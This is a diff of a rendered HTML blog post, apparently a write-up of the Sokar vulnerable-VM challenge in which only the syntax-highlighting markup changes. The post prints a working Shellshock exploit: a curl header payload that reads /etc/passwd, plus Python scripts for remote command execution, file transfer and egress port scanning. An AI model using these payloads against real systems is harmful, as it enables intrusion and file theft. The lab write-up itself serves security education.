-<span style="color:#eedd82">uid</span>=48(apache) <span style="color:#eedd82">gid</span>=48(apache) <span style="color:#eedd82">groups</span>=48(apache)
+uid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span>
 </code></pre></div><p>Yay. I was now able to execute commands as <code>apache</code>. This allowed me to enumerate a great deal of the machine with relative ease.</p>
-<h2 id="making-life-easier">making life easier</h2>
+<h2 id=making-life-easier>making life easier</h2>
 <p>Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called <code>shock.py</code>):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0">#!/usr/bin/python</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 
-<span style="color:#0f0"># Sokar Shellshock Command Execution</span>
-<span style="color:#0f0"># 2015 Leon Jacobs</span>
+<span style=color:#75715e># Sokar Shellshock Command Execution</span>
+<span style=color:#75715e># 2015 Leon Jacobs</span>
 
-<span style="color:#f00">import</span> requests
-<span style="color:#f00">import</span> sys
+<span style=color:#f92672>import</span> requests
+<span style=color:#f92672>import</span> sys
 
-<span style="color:#f00">if</span> len(sys.argv) &lt; <span style="color:#f60">2</span>:
+<span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>:
 
-    print <span style="color:#87ceeb">&#34; * Usage </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb"> &lt;cmd&gt;&#34;</span> % sys.argv[<span style="color:#f60">0</span>]
-    sys.exit(<span style="color:#f60">1</span>)
+    print <span style=color:#e6db74>&#34; * Usage </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> &lt;cmd&gt;&#34;</span> <span style=color:#f92672>%</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>]
+    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
 
-<span style="color:#0f0"># vuln@ curl -i -X OPTIONS -H &#34;User-Agent: () { :;};echo;/bin/cat /etc/passwd&#34; &#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>
-command = sys.argv[<span style="color:#f60">1</span>].strip()
-print <span style="color:#87ceeb">&#34; * Executing </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span> % command
+<span style=color:#75715e># vuln@ curl -i -X OPTIONS -H &#34;User-Agent: () { :;};echo;/bin/cat /etc/passwd&#34; &#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>
+command <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip()
+print <span style=color:#e6db74>&#34; * Executing </span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> command
 
-<span style="color:#0f0"># prepare the sploit header</span>
-headers = { <span style="color:#87ceeb">&#34;User-Agent&#34;</span>: <span style="color:#87ceeb">&#34;() { :;};echo;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % command }
-print requests.get(<span style="color:#87ceeb">&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>, headers=headers).text.strip()
-</code></pre></div><p>Using the above script, I could now just do <code>python shock.py &quot;/usr/bin/id&quot;</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python shock.py <span style="color:#87ceeb">&#34;/usr/bin/id&#34;</span>
+<span style=color:#75715e># prepare the sploit header</span>
+headers <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;() { :;};echo;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> command }
+print requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>, headers<span style=color:#f92672>=</span>headers)<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>strip()
+</code></pre></div><p>Using the above script, I could now just do <code>python shock.py "/usr/bin/id"</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python shock.py <span style=color:#e6db74>&#34;/usr/bin/id&#34;</span>
  * Executing /usr/bin/id
 
-<span style="color:#eedd82">uid</span>=48(apache) <span style="color:#eedd82">gid</span>=48(apache) <span style="color:#eedd82">groups</span>=48(apache)
+uid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span>
 </code></pre></div><p>During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that <code>netcat</code> was available and that <code>apache</code> was allowed to execute it, however, all of my attempts failed. <code>SELinux</code> was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!</p>
-<p>I was able to write to <code>/tmp</code>, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially <code>echo &lt;script source&gt; &gt;&gt; /tmp/port_scan.py</code>. Eventually I resorted to writing a helper called <code>transfer.py</code> that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0">#!/usr/bin/python</span>
+<p>I was able to write to <code>/tmp</code>, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially <code>echo &lt;script source> >> /tmp/port_scan.py</code>. Eventually I resorted to writing a helper called <code>transfer.py</code> that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 
-<span style="color:#0f0"># Sokar Shellshock File Transfer</span>
-<span style="color:#0f0"># 2015 Leon Jacobs</span>
+<span style=color:#75715e># Sokar Shellshock File Transfer</span>
+<span style=color:#75715e># 2015 Leon Jacobs</span>
 
-<span style="color:#f00">import</span> requests
-<span style="color:#f00">import</span> sys
-<span style="color:#f00">import</span> os
-<span style="color:#f00">import</span> binascii
+<span style=color:#f92672>import</span> requests
+<span style=color:#f92672>import</span> sys
+<span style=color:#f92672>import</span> os
+<span style=color:#f92672>import</span> binascii
 
-<span style="color:#f00">def</span> <span style="color:#ff0">do_command</span>(command):
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_command</span>(command):
 
-    headers = { <span style="color:#87ceeb">&#34;User-Agent&#34;</span>: <span style="color:#87ceeb">&#34;() { :;};echo;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % command }
-    r = requests.options(<span style="color:#87ceeb">&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>, headers=headers)
+    headers <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;() { :;};echo;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> command }
+    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>options(<span style=color:#e6db74>&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>, headers<span style=color:#f92672>=</span>headers)
 
-    <span style="color:#f00">if</span> not r.status_code == <span style="color:#f60">200</span>:
-        <span style="color:#f00">raise</span> Exception(<span style="color:#87ceeb">&#34; ! Command </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb"> failed&#34;</span>)
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>200</span>:
+        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>Exception</span>(<span style=color:#e6db74>&#34; ! Command </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> failed&#34;</span>)
 
-<span style="color:#f00">if</span> __name__ == <span style="color:#87ceeb">&#34;__main__&#34;</span>:
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
 
-    <span style="color:#f00">if</span> len(sys.argv) &lt; <span style="color:#f60">3</span>:
+    <span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>:
 
-        print <span style="color:#87ceeb">&#34; * Usage </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb"> &lt;source&gt; &lt;destination&gt;&#34;</span> % sys.argv[<span style="color:#f60">0</span>]
-        sys.exit(<span style="color:#f60">1</span>)
+        print <span style=color:#e6db74>&#34; * Usage </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> &lt;source&gt; &lt;destination&gt;&#34;</span> <span style=color:#f92672>%</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>]
+        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
 
-    <span style="color:#0f0"># vuln@ curl -i -X OPTIONS -H &#34;User-Agent: () { :;};echo;/bin/cat /etc/passwd&#34; &#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>
-    source = sys.argv[<span style="color:#f60">1</span>].strip()
-    destination = sys.argv[<span style="color:#f60">2</span>].strip()
-    print <span style="color:#87ceeb">&#34; * Starting transfer of local &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39; to remote &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39;&#34;</span> % (source, destination)
+    <span style=color:#75715e># vuln@ curl -i -X OPTIONS -H &#34;User-Agent: () { :;};echo;/bin/cat /etc/passwd&#34; &#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>
+    source <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip()
+    destination <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>]<span style=color:#f92672>.</span>strip()
+    print <span style=color:#e6db74>&#34; * Starting transfer of local &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; to remote &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;&#34;</span> <span style=color:#f92672>%</span> (source, destination)
 
-    hex_destination_file = <span style="color:#87ceeb">&#34;/tmp/&#34;</span> + binascii.b2a_hex(os.urandom(<span style="color:#f60">15</span>)) + <span style="color:#87ceeb">&#34;.txt&#34;</span>
-    print <span style="color:#87ceeb">&#34; * Temp file on remote will be: </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % hex_destination_file
+    hex_destination_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/tmp/&#34;</span> <span style=color:#f92672>+</span> binascii<span style=color:#f92672>.</span>b2a_hex(os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>15</span>)) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.txt&#34;</span>
+    print <span style=color:#e6db74>&#34; * Temp file on remote will be: </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> hex_destination_file
 
-    <span style="color:#0f0"># prepare a hex version of the local file</span>
-    <span style="color:#f00">with</span> open(source) <span style="color:#f00">as</span> f:
-        source_file = f.read()
+    <span style=color:#75715e># prepare a hex version of the local file</span>
+    <span style=color:#66d9ef>with</span> open(source) <span style=color:#66d9ef>as</span> f:
+        source_file <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
 
-    <span style="color:#0f0"># encode and split the source into chunks of 60</span>
-    source_file = source_file.encode(<span style="color:#87ceeb">&#39;hex&#39;</span>)
-    source_data = {}
-    source_data = [source_file[i:i+<span style="color:#f60">60</span>] <span style="color:#f00">for</span> i in range(<span style="color:#f60">0</span>, len(source_file), <span style="color:#f60">60</span>)]
+    <span style=color:#75715e># encode and split the source into chunks of 60</span>
+    source_file <span style=color:#f92672>=</span> source_file<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;hex&#39;</span>)
+    source_data <span style=color:#f92672>=</span> {}
+    source_data <span style=color:#f92672>=</span> [source_file[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>60</span>] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(source_file), <span style=color:#ae81ff>60</span>)]
 
-    print <span style="color:#87ceeb">&#34; * Transferring </span><span style="color:#87ceeb">%d</span><span style="color:#87ceeb"> chunks to </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % (len(source_data), hex_destination_file)
-    iteration = <span style="color:#f60">1</span>
-    <span style="color:#f00">for</span> chunk in source_data:
+    print <span style=color:#e6db74>&#34; * Transferring </span><span style=color:#e6db74>%d</span><span style=color:#e6db74> chunks to </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (len(source_data), hex_destination_file)
+    iteration <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+    <span style=color:#66d9ef>for</span> chunk <span style=color:#f92672>in</span> source_data:
 
-        <span style="color:#0f0"># check if it is start of file or append</span>
-        <span style="color:#f00">if</span> iteration == <span style="color:#f60">1</span>:
-            append = <span style="color:#87ceeb">&#34;&gt;&#34;</span>
-        <span style="color:#f00">else</span>:
-            append = <span style="color:#87ceeb">&#34;&gt;&gt;&#34;</span>
+        <span style=color:#75715e># check if it is start of file or append</span>
+        <span style=color:#66d9ef>if</span> iteration <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
+            append <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&gt;&#34;</span>
+        <span style=color:#66d9ef>else</span>:
+            append <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&gt;&gt;&#34;</span>
 
-        <span style="color:#0f0"># prepare the command and run it</span>
-        command = <span style="color:#87ceeb">&#34;echo &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39; </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb"> </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % (chunk, append, hex_destination_file)
+        <span style=color:#75715e># prepare the command and run it</span>
+        command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;echo &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (chunk, append, hex_destination_file)
         do_command(command)
 
-        print <span style="color:#87ceeb">&#34; * Chunk </span><span style="color:#87ceeb">%d</span><span style="color:#87ceeb">/</span><span style="color:#87ceeb">%d</span><span style="color:#87ceeb"> transferred&#34;</span> % (iteration, len(source_data))
-        iteration += <span style="color:#f60">1</span>
+        print <span style=color:#e6db74>&#34; * Chunk </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>/</span><span style=color:#e6db74>%d</span><span style=color:#e6db74> transferred&#34;</span> <span style=color:#f92672>%</span> (iteration, len(source_data))
+        iteration <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
 
-    print <span style="color:#87ceeb">&#34; * Decoding hex on remote&#34;</span>
-    command = <span style="color:#87ceeb">&#34;/usr/bin/xxd -r -p </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb"> &gt; </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % (hex_destination_file, destination)
+    print <span style=color:#e6db74>&#34; * Decoding hex on remote&#34;</span>
+    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/usr/bin/xxd -r -p </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> &gt; </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (hex_destination_file, destination)
     do_command(command)
 
-    print <span style="color:#87ceeb">&#34; * Cleaning up temp file </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % hex_destination_file
-    command = <span style="color:#87ceeb">&#34;/bin/rm -f </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> %  hex_destination_file
+    print <span style=color:#e6db74>&#34; * Cleaning up temp file </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> hex_destination_file
+    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/bin/rm -f </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span>  hex_destination_file
     do_command(command)
 
-    print <span style="color:#87ceeb">&#34; * Local &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39; transferred to remote &#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39;&#34;</span> % (source, destination)
-</code></pre></div><h2 id="egress-firewalls-le-suck">egress firewalls le-suck</h2>
+    print <span style=color:#e6db74>&#34; * Local &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; transferred to remote &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;&#34;</span> <span style=color:#f92672>%</span> (source, destination)
+</code></pre></div><h2 id=egress-firewalls-le-suck>egress firewalls le-suck</h2>
 <p>With the file transfer script done, I coded up a small &lsquo;port scanner&rsquo; (though all it really does is try to connect to a port and move on to the next within 0.1s):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0">#!/usr/bin/python</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 
-<span style="color:#0f0"># Sokar Egress Port Scanner</span>
-<span style="color:#0f0"># 2015 Leon Jacobs</span>
+<span style=color:#75715e># Sokar Egress Port Scanner</span>
+<span style=color:#75715e># 2015 Leon Jacobs</span>
 
-<span style="color:#f00">import</span> socket
+<span style=color:#f92672>import</span> socket
 
-<span style="color:#f00">for</span> port in xrange(<span style="color:#f60">1</span>, <span style="color:#f60">65535</span>):
+<span style=color:#66d9ef>for</span> port <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>65535</span>):
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(<span style="color:#f60">0.1</span>)
-    print <span style="color:#87ceeb">&#34;Trying port </span><span style="color:#87ceeb">%d</span><span style="color:#87ceeb">&#34;</span> % port
-    sock.connect_ex((<span style="color:#87ceeb">&#34;192.168.217.174&#34;</span>, port))
-    sock.close()
+    sock <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
+    sock<span style=color:#f92672>.</span>settimeout(<span style=color:#ae81ff>0.1</span>)
+    print <span style=color:#e6db74>&#34;Trying port </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> port
+    sock<span style=color:#f92672>.</span>connect_ex((<span style=color:#e6db74>&#34;192.168.217.174&#34;</span>, port))
+    sock<span style=color:#f92672>.</span>close()
 
-</code></pre></div><p>&hellip; and transferred it to Sokar using my <code>transfer.py</code> script:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
- * Starting transfer of local <span style="color:#87ceeb">&#39;port_scan.py&#39;</span> to remote <span style="color:#87ceeb">&#39;/tmp/port_scan.py&#39;</span>
+</code></pre></div><p>&mldr; and transferred it to Sokar using my <code>transfer.py</code> script:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py
+ * Starting transfer of local <span style=color:#e6db74>&#39;port_scan.py&#39;</span> to remote <span style=color:#e6db74>&#39;/tmp/port_scan.py&#39;</span>
  * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt
- * Transferring <span style="color:#f60">10</span> chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
+ * Transferring <span style=color:#ae81ff>10</span> chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt
  * Chunk 1/10 transferred
  * Chunk 2/10 transferred
  * Chunk 3/10 transferred
@@ -450,50 +317,50 @@ print requests.get(<span style="color:#87ceeb">&#34;http://192.168.217.163:591/c
  * Chunk 10/10 transferred
  * Decoding hex on remote
  * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt
- * Local <span style="color:#87ceeb">&#39;port_scan.py&#39;</span> transferred to remote <span style="color:#87ceeb">&#39;/tmp/port_scan.py&#39;</span>
+ * Local <span style=color:#e6db74>&#39;port_scan.py&#39;</span> transferred to remote <span style=color:#e6db74>&#39;/tmp/port_scan.py&#39;</span>
 </code></pre></div><p>I also opened up a <code>tcpdump</code> on my local Kali Linux VM, filtering out <code>tcp/591</code> as well as <code>arp</code> traffic:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port <span style="color:#f60">591</span>
-tcpdump: verbose output suppressed, use -v or -vv <span style="color:#f00">for</span> full protocol decode
-listening on eth1, link-type EN10MB (Ethernet), capture size <span style="color:#f60">65535</span> bytes
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port <span style=color:#ae81ff>591</span>
+tcpdump: verbose output suppressed, use -v or -vv <span style=color:#66d9ef>for</span> full protocol decode
+listening on eth1, link-type EN10MB <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>, capture size <span style=color:#ae81ff>65535</span> bytes
 
 </code></pre></div><p>Finally, I fired the scanner off using the previously developed <code>shock.py</code> script:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python shock.py <span style="color:#87ceeb">&#34;/usr/bin/python /tmp/port_scan.py&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python shock.py <span style=color:#e6db74>&#34;/usr/bin/python /tmp/port_scan.py&#34;</span>
  * Executing /usr/bin/python /tmp/port_scan.py
 
-</code></pre></div><p>I waited&hellip; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the <code>tcpdump</code> had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.</p>
-<h2 id="bynarr-the-fruit">bynarr the fruit</h2>
+</code></pre></div><p>I waited&mldr; a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the <code>tcpdump</code> had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.</p>
+<h2 id=bynarr-the-fruit>bynarr the fruit</h2>
 <p>Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that <code>/home/bynarr</code> was readable to me. In there was what looked like a kernel module <code>lime.ko</code> and a script called <code>lime</code> to <code>insmod</code> it. Both were owned by root:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python shock.py <span style="color:#87ceeb">&#34;/bin/cat /home/bynarr/lime&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ python shock.py <span style=color:#e6db74>&#34;/bin/cat /home/bynarr/lime&#34;</span>
  * Executing /bin/cat /home/bynarr/lime
 
-<span style="color:#0f0">#!/bin/bash</span>
-echo <span style="color:#87ceeb">&#34;&#34;&#34;
-</span><span style="color:#87ceeb">==========================
-</span><span style="color:#87ceeb">Linux Memory Extractorator
-</span><span style="color:#87ceeb">==========================
-</span><span style="color:#87ceeb">&#34;</span>
-echo <span style="color:#87ceeb">&#34;LKM, add or remove?&#34;</span>
-echo -en <span style="color:#87ceeb">&#34;&gt; &#34;</span>
+<span style=color:#75715e>#!/bin/bash</span>
+echo <span style=color:#e6db74>&#34;&#34;&#34;
+</span><span style=color:#e6db74>==========================
+</span><span style=color:#e6db74>Linux Memory Extractorator
+</span><span style=color:#e6db74>==========================
+</span><span style=color:#e6db74>&#34;</span>
+echo <span style=color:#e6db74>&#34;LKM, add or remove?&#34;</span>
+echo -en <span style=color:#e6db74>&#34;&gt; &#34;</span>
 
 read -e input
 
-<span style="color:#f00">if</span> [ <span style="color:#eedd82">$input</span> == <span style="color:#87ceeb">&#34;add&#34;</span> ]; <span style="color:#f00">then</span>
+<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> $input <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;add&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
 
-    /sbin/insmod /home/bynarr/lime.ko <span style="color:#87ceeb">&#34;path=/tmp/ram format=raw&#34;</span>
+    /sbin/insmod /home/bynarr/lime.ko <span style=color:#e6db74>&#34;path=/tmp/ram format=raw&#34;</span>
 
-<span style="color:#f00">elif</span> [ <span style="color:#eedd82">$input</span> == <span style="color:#87ceeb">&#34;remove&#34;</span> ]; <span style="color:#f00">then</span>
+<span style=color:#66d9ef>elif</span> <span style=color:#f92672>[</span> $input <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;remove&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
 
     /sbin/rmmod lime
 
-<span style="color:#f00">else</span>
+<span style=color:#66d9ef>else</span>
 
-    echo <span style="color:#87ceeb">&#34;Invalid input, burn in the fires of Netu!&#34;</span>
+    echo <span style=color:#e6db74>&#34;Invalid input, burn in the fires of Netu!&#34;</span>
 
-<span style="color:#f00">fi</span>
+<span style=color:#66d9ef>fi</span>
 
-</code></pre></div><p>I knew that the chances were slim that it would allow me to run <code>insmod</code> as <code>apache</code>, but ofc I tried running the script regardless. Due to the fact that the file called <code>/tmp/ram</code> was not created after running <code>python shock.py &quot;echo \&quot;add\&quot; | /home/bynarr/lime&quot;</code>, I assumed it failed.</p>
+</code></pre></div><p>I knew that the chances were slim that it would allow me to run <code>insmod</code> as <code>apache</code>, but ofc I tried running the script regardless. Due to the fact that the file called <code>/tmp/ram</code> was not created after running <code>python shock.py "echo \"add\" | /home/bynarr/lime"</code>, I assumed it failed.</p>
 <p>Later, some more enumeration finally got me to <code>/var/spool/mail/bynarr</code> with a message with the following contents:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">leonjza@kali/sokar $ python shock.py &#34;/bin/cat /var/spool/mail/bynarr&#34;
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>leonjza@kali/sokar $ python shock.py &#34;/bin/cat /var/spool/mail/bynarr&#34;
  * Executing /bin/cat /var/spool/mail/bynarr
 
 Return-Path: &lt;root@sokar&gt;
@@ -517,200 +384,200 @@ All the best in your new role!
 
   -Sokar-
 </code></pre></div><p>I confirmed that <code>bynarr</code> was in the groups mentioned in the mail:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ python shock.py <span style="color:#87ceeb">&#34;/usr/bin/id bynarr&#34;</span>
